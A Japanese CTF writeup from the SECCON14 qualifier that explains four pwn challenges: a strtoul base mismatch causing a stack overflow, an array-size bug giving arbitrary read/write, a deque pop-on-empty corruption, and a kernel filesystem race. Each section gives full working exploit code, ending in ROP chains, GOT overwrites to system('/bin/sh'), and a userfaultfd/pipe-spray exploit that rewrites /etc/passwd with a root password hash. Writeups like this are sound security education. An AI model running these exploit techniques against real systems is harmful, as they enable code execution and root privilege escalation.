---
title: SECCON14 Quals Writeup
tags:
  - ctf
  - writeup
  - jp
date: 2025-12-16 00:24:26
---


SECCON14 QualsにKUDoSで出場  
全体32位、国内5位でした。  

自分はpwn4問を解いたのでそのwriteupを載せます。  

- [pwn](#pwn)
  - [unserialize](#unserialize)
  - [Gachiarray](#gachiarray)
  - [CursedST](#cursedst)
  - [tinyfs](#tinyfs)
- [感想](#感想)

## pwn
### unserialize
alloca()でstackを拡張する際にはstrtoulの第3引数に0を使用しているが、
ループの処理で使用するszはstrtoulの第3引数に10を使用している。

```c
  tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0));

  size_t sz = strtoul(szbuf, NULL, 10);
  for (size_t i = 0; i < sz; i++) {
    if (fscanf(fp, "%02hhx", tmpbuf + i) != 1) {
      return -1;
    }
  }
```
そのため` szbuf = "0177"`のような入力を与えると
1回目のstrtoulは8進数と解釈して127になるが、2回目のstrtoulは177として扱うので
ループでstack overflowが起きる。

tmpbufがoverflowした先にはmemcpyのコピー先のバッファのポインタが格納されており、
以下の場合だと下位1byteを0x10にするとstack canaryを壊さずにreturn addressを書き換えることができる。

```
0x7fffffffdc40: 0x6161616161616161      0x6161616161616161
0x7fffffffdc50: 0x6161616161616161      0x6161616161616161
0x7fffffffdc60: 0x6161616161616161      0x6161616161616161
0x7fffffffdc70: 0x6161616161616161      0x6161616161616161
0x7fffffffdc80: 0x6161616161616161      0x6161616161616161
0x7fffffffdc90: 0x6161616161616161      0x6161616161616161
0x7fffffffdca0: 0x6161616161616161      0x6161616161616161
0x7fffffffdcb0: 0x00007fffffffdd20      0x00000000004ca440  <- buf | fp
0x7fffffffdcc0: 0x0000000000000004      0x000000000000006f
0x7fffffffdcd0: 0x00007fffffffdc40      0x0000000000000071
0x7fffffffdce0: 0x00007f0033313130      0x000000000045afcb
0x7fffffffdcf0: 0x0000000000000001      0x00007fffffffdf48
0x7fffffffdd00: 0x00007fffffffdf58      0x3980e43602fc8100  <- xxx | canary
0x7fffffffdd10: 0x00007fffffffde30      0x0000000000401c1f  <- old rbp | return address
0x7fffffffdd20: 0x0000000000000000      0x00000000004c5ee0  <- buf start | xxx
```

リモートの環境でスタックアドレスはもちろんランダムなので、1/16の確率でropを行うことができる。

* solver
```py
#!/usr/bin/python3
from ptrlib import *
import sys

FILE_NAME = "./chall"
"""
HOST = "unserialize.seccon.games"
PORT = 5000
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
        sock = Socket(HOST, PORT)
else:
        sock = Process(FILE_NAME)

sock.debug = True
elf = ELF(FILE_NAME)
off_rdi_rbp_ret = next(elf.gadget("pop rdi; pop rbp; ret;"))
off_rsi_ret = next(elf.gadget("pop rsi; ret;"))
off_syscall_ret = next(elf.gadget("syscall; ret;"))
off_rax_ret = next(elf.gadget("pop rax; ret;"))

def exploit():
        l = 0x70
        rop = b''
        rop += b'/bin/sh\x00'
        rop += p64(off_rsi_ret)
        rop += p64(0)
        rop += p64(off_rax_ret)
        rop += p64(0x3b)
        rop += p64(off_syscall_ret)

        payload = b''
        payload += rop
        payload += b'a'*(l-len(payload))
        payload += b'\x10'
        s = "0"+str(l+1)
        s += ":"
        s += payload.hex()
        sock.send(s)
        sock.interactive()

if __name__ == "__main__":
        exploit()
```

### Gachiarray
色々実験している中でarray_initでcapacity=0x80000001, size=1とかを渡した際、
本来はmallocが失敗するのでソースコード上はg_array.sizeもg_array.capacityも0に設定されるはずであるが、
g_array.capacityに0x800000001が設定されていることに気づく。(コンパイルのバグらしいが、コンテスト中はよくわからないまま進めた)

```c
   g_array.data = (int*)malloc(pkt->capacity * sizeof(int));
   if (!g_array.data)
     *(uint64_t*)pkt = 0; 
     
   g_array.size = pkt->size;
   g_array.capacity = pkt->capacity;
   g_array.initial = pkt->initial;
```

この状況が作れると`g_array.data = 0`やg_arrayのsizeやcapacityはuint32_tになっていることを利用して、
capacity以下のアドレス空間でAAR/AAWができる。  
あとはGOT overwriteをしてshellを起動する。
 
```python
#!/usr/bin/python3
from ptrlib import *
import sys

FILE_NAME = "./chall"
#"""
HOST = "gachiarray.seccon.games"
PORT = 5000
"""
HOST = "localhost"
#PORT = 5000
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	sock = Socket(HOST, PORT)
else:
	sock = Process(FILE_NAME)

sock.debug = True
elf = ELF(FILE_NAME)

libc = ELF('./libc.so.6')

def get(idx):
	payload = b''
	payload += p32(0x1) # op
	payload += p32(idx) # index
	payload += p32(0) 	# value
	sock.send(payload)
	sock.recvuntil(" = ")
	return int(sock.recvline(),10)&0xffffffff

def set(idx, value):
	payload = b''
	payload += p32(0x2) 	# op
	payload += p32(idx) 	# index
	payload += p32(value)	# value
	sock.send(payload)

def resize(size):
	payload = b''
	payload += p32(0x3) # op
	payload += p32(size) # size
	payload += p32(0) 	 
	sock.send(payload)

base = 0

def set_base_lower(address):
	set(0x404080//4, address&0xffffffff)
	base |= address&0xffffffff

def set_base_upper(address):
	set(0x404084//4, (address>>32)&0xffffffff)
	base |= address & 0xffffffff00000000

def AAW32(address, value):
	idx = (address - base)//4
	set(idx, value)
		
def AAW64(address, value):
	AAW32(address, value&0xffffffff)
	AAW32(address+4, value>>32)

def AAR32(address):
	idx = (address - base)//4
	return get(idx)
		
def AAR64(address):
	return AAR32(address) | (AAR32(address+4)<<32)


def exploit():
	# init
	payload = b''
	payload += p32(0x80000001) # cap
	payload += p32(0x1) # size
	payload += p32(0) # init
	sock.send(payload)

	resize(0x80000000)
	libc_base = AAR64(elf.got("setbuf"))-libc.symbol("setbuf")
	libc.base = libc_base
	print("libc_base = "+hex(libc_base))

	AAW32(0x404070, 0xffffffff)	
	AAW32(0x404074, 0xffffffff)	
	AAW64(0x404100, u64("/bin/sh"))

	AAW64(elf.got("malloc"), libc.symbol("system"))
	AAW64(elf.got("exit"), elf.symbol("main"))

	# adjust stack
	payload = b''
	payload += p32(0x4) # op
	payload += p32(0) # size
	payload += p32(0) 	 
	sock.send(payload)

	# malloc(0x404100) -> system("/bin/sh")
	payload = b''
	payload += p32(0x404100//0x4) # op
	payload += p32(0) # size
	payload += p32(0) 	 
	sock.send(payload)

	sock.interactive()	

if __name__ == "__main__":
	exploit()
```

結構早い段階で気づけてラッキー

### CursedST
データが空の時にpopを行うと未定義動作になることを利用してexploitを頑張って組む。  

例えば　S.push(1)を一回実行した時はSのメモリレイアウトは下記のような状態になる。
```
gef> x/10gx 0x405320
0x405320 <S>:	0x000000001d3992b0	0x0000000000000008
0x405330 <S+16>:	0x000000001d399300	0x000000001d399300
0x405340 <S+32>:	0x000000001d399500	0x000000001d3992c8
0x405350 <S+48>:	0x000000001d399308	0x000000001d399300
0x405360 <S+64>:	0x000000001d399500	0x000000001d3992c8
gef> x/8gx 0x000000001d3992b0
0x1d3992b0:	0x0000000000000000	0x0000000000000000
0x1d3992c0:	0x0000000000000000	0x000000001d399300
0x1d3992d0:	0x0000000000000000	0x0000000000000000
0x1d3992e0:	0x0000000000000000	0x0000000000000000
gef> x/10gx 0x000000001d399300
0x1d399300:	0x0000000000000001	0x0000000000000000
0x1d399310:	0x0000000000000000	0x0000000000000000
0x1d399320:	0x0000000000000000	0x0000000000000000
0x1d399330:	0x0000000000000000	0x0000000000000000
0x1d399340:	0x0000000000000000	0x0000000000000000
```

この状態でS.pop()を2回実行すると S+48からの領域が壊れていそうである。

```
0x405320 <S>:	0x000000001d3992b0	0x0000000000000008
0x405330 <S+16>:	0x000000001d399300	0x000000001d399300
0x405340 <S+32>:	0x000000001d399500	0x000000001d3992c8
0x405350 <S+48>:	0x00000000000001f8	0x0000000000000000
0x405360 <S+64>:	0x0000000000000200	0x000000001d3992c0
```

この状態でS.push(2)をすると以下の箇所でクラッシュする。

```
$rax   : 0x0000000000000002
$rbx   : 0x00000000000001f8
$rcx   : 0x0000000000405320 <S>  ->  0x000000001d3992b0  ->  0x0000000000000000
$rdx   : 0x00000000000001f8
$rsp   : 0x00007fff6b365570  ->  0x00007fff6b365660  ->  0x0000000000000002
$rbp   : 0x00007fff6b3655c0  ->  0x00007fff6b365620  ->  0x00007fff6b365640  ->  0x00007fff6b365670  ->  ...
$rsi   : 0x00000000000001f8
$rdi   : 0x00007fff6b365660  ->  0x0000000000000002
$rip   : 0x0000000000401e10 <void std::deque<unsigned long, std::allocator<unsigned long> >::_M_push_back_aux<unsigned long const&>(unsigned long const&)+0xdc>  ->  0x458b489090038948
$r8    : 0x00007d00d3a79e00  ->  0x00007d00d3a72a08 <vtable for __gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >+0x10>  ->  0x00007d00d39280c0 <__gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >::~stdio_sync_filebuf()>  ->  0x9d058b48fa1e0ff3
$r9    : 0x00000000ffffffff
$r10   : 0x0000000000000000
$r11   : 0x000000000000000a
$r12   : 0x0000000000000001
$r13   : 0x0000000000000000
$r14   : 0x0000000000404dd0 <__do_global_dtors_aux_fini_array_entry>  ->  0x0000000000401340 <__do_global_dtors_aux>  ->  0x3fad3d80fa1e0ff3
$r15   : 0x00007d00d3bc2000 <_rtld_global>  ->  0x00007d00d3bc32e0  ->  0x0000000000000000
$eflags: 0x10206 [ident align vx86 RESUME nested overflow direction INTERRUPT trap sign zero adjust PARITY carry] [Ring=3]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- stack ----
$rsp  0x7fff6b365570|+0x0000|+000: 0x00007fff6b365660  ->  0x0000000000000002  <-  $rdi
      0x7fff6b365578|+0x0008|+001: 0x0000000000405320 <S>  ->  0x000000001d3992b0  ->  0x0000000000000000  <-  $rcx
      0x7fff6b365580|+0x0010|+002: 0x0000000000405320 <S>  ->  0x000000001d3992b0  ->  0x0000000000000000  <-  $rcx
      0x7fff6b365588|+0x0018|+003: 0x00000000000001f8
      0x7fff6b365590|+0x0020|+004: 0x00007fff6b365660  ->  0x0000000000000002  <-  $rdi
      0x7fff6b365598|+0x0028|+005: 0x0000000000405320 <S>  ->  0x000000001d3992b0  ->  0x0000000000000000  <-  $rcx
      0x7fff6b3655a0|+0x0030|+006: 0x00000000000001f8
      0x7fff6b3655a8|+0x0038|+007: 0x00007fff6b365660  ->  0x0000000000000002  <-  $rdi
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- code: x86:64 (gdb-native) ----
    0x401e05 4889c7                  <void std::deque<unsigned long, std::allocator<unsigned long> >::_M_push_back_aux<unsigned long const&>(unsigned long const&)+0xd1>   mov    rdi, rax 
    0x401e08 e8d0030000              <void std::deque<unsigned long, std::allocator<unsigned long> >::_M_push_back_aux<unsigned long const&>(unsigned long const&)+0xd4>   call   0x4021dd <unsigned long const& std::forward<unsigned long const&>(std::remove_reference<unsigned long const&>::type&)> 
    0x401e0d 488b00                  <void std::deque<unsigned long, std::allocator<unsigned long> >::_M_push_back_aux<unsigned long const&>(unsigned long const&)+0xd9>   mov    rax, QWORD PTR [rax] 
 -> 0x401e10 488903                  <void std::deque<unsigned long, std::allocator<unsigned long> >::_M_push_back_aux<unsigned long const&>(unsigned long const&)+0xdc>   mov    QWORD PTR [rbx], rax 
```

AIくんの力も借りつつこの挙動を調査したところ、
0x1d3992b0からの領域はstackのデータを格納するchunkの配列になっており、
例えば0x1d3992c8に格納されている0x1d399300から0x200バイトの領域をpushで埋め尽くすと、
新たな領域を確保しそのアドレスを0x1d3992d0に格納するような挙動をする。

popでデータを消費するとその逆が起こるが、データが空の時にpopをすると
0x1d3992c0に格納されている0x0を次に参照するstackのデータのポインタとして処理するため
S+48空の構造体が壊れてしまうといった具合である。

そのためあらかじめ0x1d3992c0の部分にデータ領域として使用させたい値を用意できていると嬉しい。
今回はそれが可能であり、具体的にはnameに長大な文字列を入力しfreed chunkを用意しておくと、
heap上に残ったゴミをアドレスとして使用させることができるので実質的なAAR/AAWが可能になる。

あとはnameのアドレスも書き換えつつGOT overwriteでmain関数のnameを出力する直前に飛んでアドレスリーク、  
からの再度GOT overwriteしてsystem("/bin/sh")の実行

```python
#!/usr/bin/python3
from ptrlib import *
import sys

FILE_NAME = "./dist/st"
#"""
HOST = "st.seccon.games"
PORT = 5000
"""
HOST = "localhost"
#PORT = 7777
PORT = 5000
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	sock = Socket(HOST, PORT)
else:
	sock = Process(FILE_NAME)

sock.debug = True
elf = ELF(FILE_NAME)
got_good = 0x405088
addr_name= 0x405300
addr_s = 0x405320
addr_t = 0x405380
got_memmove = elf.got("memmove")
#
libc = ELF('./libc.so.6')

def s_push(val):
	sock.sendline("1")	
	sock.sendline(str(val))

def s_pop():
	sock.sendline("2")	

def t_push(val):
	sock.sendline("3")	
	sock.sendline(str(val))

def t_pop():
	sock.sendline("4")	

def exploit():
	name = b''
	name += b'x'*0x28
	name += b"a"*(0x640-len(name))
	name += p64(0)
	name += p64(0)
	name += p64(got_memmove-0x1f0)
	name += p64(addr_t+0x50-0x1f8)
	name += b"b"*(0x800-len(name))
	sock.sendlineafter("name?\n", name)	
	sock.recvline()
	for i in range(0x40*0x5):
		s_push(i)
	for i in range(0x40*0x5):
		s_pop()
	
	addr_overwrite =  0x405040
	s_pop()
	
	s_pop() # offset4
	s_pop()
	s_push(addr_overwrite+0x10)
	s_pop()
	
	s_pop()
	s_push(addr_overwrite+0x10-0x200)
	s_pop()
	
	s_pop()
	s_push(addr_overwrite)
	s_pop()
	
	for i in range(22):
		s_pop()
	addr_gomi = 0x4050a8
	off_gomi = 0x2fa5a0 
	s_push(addr_gomi)
	s_push(8)
	s_pop()
	
	jump =  0x4013d5	
	t_push(jump)
	for i in range(0x40-26):
		s_pop()
	s_push(u64(b"/bin/sh\x00"))
	s_pop()
	s_pop()
	sock.recvuntil("Hello, ")
	addr_libc = u64(sock.recv(8)) - off_gomi
	libc.base = addr_libc
	sock.recv()

	# adjust rsp
	s_push(u64(b"/bin/sh\x00"))
	s_pop()
	t_pop()
	t_push(jump)
	s_pop()

	# delete("/bin/sh") -> system("/bin/sh")
	s_push(u64(b"/bin/sh\x00"))
	s_pop()
	t_pop()
	t_push(libc.symbol("system"))
	s_pop()

	sock.interactive()	

if __name__ == "__main__":
	exploit()
```

### tinyfs
800行近いソースだったのでLLMくんに脆弱性見つけてと投げたところ、
ファイルへの書き込みを行う際のcopy_from_userを排他制御していないためraceが起こることを指摘してくれた。

```c
     len = min_t(size_t, len, TINY_FS_BLOCKSIZE - *ppos);
     if (copy_from_user(fs_node->data + *ppos, buf, len)) {
         ret = -EFAULT;
         goto ERR;
     }   
     *ppos += len;
```
改めてソースを見直すも、正しいことを言ってそうなのでuserfalutfdを利用したraceを行い、
最終的にはpage jackで/etc/passwdを書き換える。

```c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <poll.h>
#include <err.h>
#include <stdint.h>
#include <assert.h>

#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <sys/ioctl.h>

#include <linux/userfaultfd.h>

// for userfaultfd
void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void create_pipe();

static void* fault_handler_thread(void *arg) {
  unsigned char *dummy_page;
  static struct uffd_msg msg;
  struct uffdio_copy copy;
  struct pollfd pollfd;
  long uffd;
  static int fault_cnt = 0;

  uffd = (long)arg;

  dummy_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dummy_page == MAP_FAILED) fatal("mmap(dummy)");

  puts("[+] fault_handler_thread: waiting for page fault...");
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      fatal("poll");

    if (read(uffd, &msg, sizeof(msg)) <= 0) fatal("read(uffd)");
    assert (msg.event == UFFD_EVENT_PAGEFAULT);

    printf("[+] uffd: flag=0x%llx\n", msg.arg.pagefault.flags);
    printf("[+] uffd: addr=0x%llx\n", msg.arg.pagefault.address);

	//todo
	unlink("/mnt/tiny/test");
	create_pipe(0);

	dummy_page[0] = 0x40;
    copy.src = (unsigned long)dummy_page;
    copy.dst = (unsigned long)msg.arg.pagefault.address & ~0xfff;
    copy.len = 0x1000;
    copy.mode = 0;
    copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &copy) == -1) fatal("ioctl(UFFDIO_COPY)");
  }

  return NULL;
}

int register_uffd(void *addr, size_t len) {
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  long uffd;
  pthread_t th;

  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1) fatal("userfaultfd");

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    fatal("ioctl(UFFDIO_API)");

  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    fatal("UFFDIO_REGISTER");

  if (pthread_create(&th, NULL, fault_handler_thread, (void*)uffd))
    fatal("pthread_create");

  return 0;
}


void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

#define PIPE_NUM 0x80
#define FILE_NUM 0x1000

int pipe_fd[PIPE_NUM*2][2];
int file_fd[FILE_NUM];

void *page;

void create_pipe(uint32_t offset)
{
	uint32_t i;
	void *tmp = malloc(0x1000);
	uint64_t pipe_magic;	
	
    for(i = 0; i < PIPE_NUM; i++) {
        if(pipe(pipe_fd[i+offset]) <0) {
            fatal("[E] pipe spray");
        }
    }
 
    for(i = 0; i < PIPE_NUM; i++) {
        if(fcntl(pipe_fd[i+offset][1], F_SETPIPE_SZ, 0x1000*0x40) < 0 ) {
            fatal("[E] pipe fcntl()");
        }
    }
 
    for(i = 0; i < PIPE_NUM; i++) {
        memcpy(tmp, "ABCD1234", 0x8);
        pipe_magic = 0xdeadbeef+i;
        write(pipe_fd[i+offset][1], tmp, 0x8);
        write(pipe_fd[i+offset][1], &pipe_magic, 0x8);
    }
	puts("[+] create_pipe");
}

int main(){
	bind_core(0);
	// rece condition
  	void *page;
  	page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
  	            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  	if (page == MAP_FAILED) fatal("mmap");
	register_uffd(page, 0x1000);
	
	int fd1, fd2;
	uint64_t pipe_magic;	
	uint32_t i;
	
	create_pipe(PIPE_NUM);
	fd1 = open("/mnt/tiny/test", O_RDWR|O_CREAT);
	if(fd1 < 0) fatal("open test");
	
	write(fd1, page, 1);
	
	//after uaf	
	size_t victim_idx, prev_idx = 0;
	uint64_t magic = 0;
	void *tmp1 = malloc(0x1000);

	for(uint32_t i = 0; i < PIPE_NUM*2; i++) {
		read(pipe_fd[i][0], tmp1, 0x8);
		read(pipe_fd[i][0], &magic, 0x8);
		if((magic != 0xdeadbeef+i) && (memcmp(tmp1, "ABCD1234", 8) == 0)) {
			puts(tmp1);
			victim_idx = magic - 0xdeadbeef;
			if(victim_idx >= PIPE_NUM*2) {
				fatal("[E] something wrong");
			}
			prev_idx = i;
			printf("Found two pipes dup %lu - %lu\n", victim_idx, prev_idx);
			break;
		}
	}
	
	write(pipe_fd[prev_idx][1], tmp1, 0x4);
	
	close(pipe_fd[victim_idx][0]);
	close(pipe_fd[victim_idx][1]);
	
	for(uint32_t i = 0; i < FILE_NUM; i++) {
		file_fd[i] = open("/etc/passwd", 0);
		if(!file_fd[i]) {
			fatal("open");
		}
	}
	
	int mode = 0x480e801f;
	write(pipe_fd[prev_idx][1], &mode, 4);
	char *data = "root:$1$vjp$MwIITGBsI/yq9SjW7FXPj0:0:0:root:/root:/bin/sh\nctf:x:0:0:CTF Challenger:/:/bin/sh\n";
	memset(tmp1, 0, 0x200);
	memcpy(tmp1, data, strlen(data));

	for(uint32_t i = 0; i < FILE_NUM; i++) {
		int retval = write(file_fd[i], tmp1, 0x200);
		if(retval > 0) {
			printf("Write Success!\n");
			system("cat /etc/passwd");	
		}
	}

	printf("hello km2\n");
	return 0;
}
```


## 感想
今年で3回目のfinal出場になりそうでなにより

To運営の方々  
毎年楽しいコンテストありがとうございます！